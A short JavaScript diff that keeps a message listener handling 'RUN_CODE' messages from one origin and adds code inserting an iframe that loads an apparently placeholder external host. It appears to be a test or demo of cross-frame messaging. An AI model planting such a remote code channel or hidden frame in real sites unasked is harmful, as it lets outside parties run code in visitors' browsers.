@@ -1,3 +1,4 @@
+{
 addEventListener('message', e => {
   if (e.origin === 'https://weizmangal.com') {
     if (e.data.type === 'RUN_CODE') {
@@ -6,3 +7,8 @@ addEventListener('message', e => {
     }
   }
 });
+
+const i = document.createElement('iframe');
+i.src = 'https://fake.helper4455.com';
+document.body.appendChild(i);
+}
